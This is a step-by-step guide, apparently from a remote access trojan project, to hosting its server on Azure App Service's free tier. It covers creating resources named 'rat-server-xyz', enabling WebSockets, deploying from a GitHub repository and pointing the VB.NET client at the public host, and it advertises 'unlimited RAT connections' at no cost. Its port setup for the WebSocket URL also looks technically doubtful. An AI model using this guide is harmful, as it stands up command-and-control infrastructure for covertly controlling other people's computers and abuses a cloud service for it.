# Azure App Service - Portal Setup Guide

## Quick Setup (5 minutes, No CLI needed)

### Step 1: Create Azure Account
1. Go to https://azure.microsoft.com/free
2. Click "Start free"
3. Sign in with Microsoft/GitHub account
4. Verify phone number
5. You get $200 free credits for 30 days + 12 months free services

### Step 2: Create App Service (Via Portal)
1. Go to https://portal.azure.com
2. Click "Create a resource"
3. Search: **App Service**
4. Click "Create"

**Configuration:**
- **Subscription**: Azure free trial
- **Resource Group**: Create new → `rat-deployment`
- **Name**: `rat-server-xyz` (must be globally unique)
- **Publish**: Code
- **Runtime stack**: `.NET Framework 4.8`
- **Operating System**: Windows
- **Region**: East US (closest to you)
- **App Service Plan**: Create new
  - **Name**: `rat-plan`
  - **Sku and size**: Free (F1) - $0/month
  
5. Click "Review + Create"
6. Click "Create"
7. Wait for deployment (2-3 minutes)

### Step 3: Enable WebSocket
1. Go to your App Service (search for `rat-server-xyz`)
2. Left menu → **Settings** → **Configuration**
3. Click **General settings** tab
4. Find **Web sockets** → toggle **ON**
5. Click **Save**

### Step 4: Deploy from GitHub
1. In your App Service, go to **Deployment Center** (left menu)
2. **Source**: GitHub
3. **Authorize** and select:
   - **Organization**: amakamerit62-design
   - **Repository**: db
   - **Branch**: main
4. Click **Save**
5. Azure automatically deploys when you push to GitHub!

### Step 5: Get Your Public URL
1. In App Service, click **Overview**
2. Copy the **Default domain** URL
   - Example: `https://rat-server-xyz.azurewebsites.net`

### Step 6: Update Client Configuration
1. Edit `Client/Program.vb`
2. Find lines 50-52:
   ```vb
   Const SERVER_HOST = "localhost"
   Const SERVER_PORT = 9823
   ```
3. Change to:
   ```vb
   Const SERVER_HOST = "rat-server-xyz.azurewebsites.net"
   Const SERVER_PORT = 9823
   ```
4. Rebuild: `dotnet build Client/Client.vbproj -c Release`

### Step 7: Test Connection
1. Run updated client
2. Check `Desktop/client_debug.log` for connection message:
   ```
   [CLIENT] WebSocket connected to ws://rat-server-xyz.azurewebsites.net:9823
   ```

### Step 8: Monitor Server Logs
In Azure Portal:
1. Go to your App Service
2. **Monitoring** → **Logs** or **Log stream**
3. Watch real-time logs

---

## Pricing

| Resource | Cost |
|----------|------|
| App Service Plan (F1) | **Free** ($0/month) |
| Data transfer | **Free** (first 1 GB/month) |
| Custom domain | Optional (+$10/year) |

**Total: $0-15/month for unlimited RAT connections**

---

## Troubleshooting

**"InvalidBaseImagePlatform" error**
- Don't use Docker - use native Azure App Service

**"WebSocket connection failed"**
- Verify WebSocket is enabled (Step 3)
- Check firewall rules (Application Insights)

**"404 Not Found"**
- Wait for deployment to complete
- Check GitHub Actions for build errors

**Slow startup**
- Free tier wakes up slowly
- Use Basic tier (B1) for always-on: ~$12/month

---

## Next Steps

1. ✅ Create App Service
2. ✅ Enable WebSocket
3. ✅ Deploy from GitHub
4. ✅ Get public URL
5. ✅ Update Client
6. ✅ Test end-to-end
7. 🔒 (Optional) Enable TLS/HTTPS with certificate

---

## Cost Optimization

- Free tier: 1 GB RAM, can sleep, good for testing
- Basic tier (B1): Always-on, recommended for production ($12/mo)
- Standard tier: Better performance, multiple instances ($50+/mo)

Start free, upgrade later if needed!
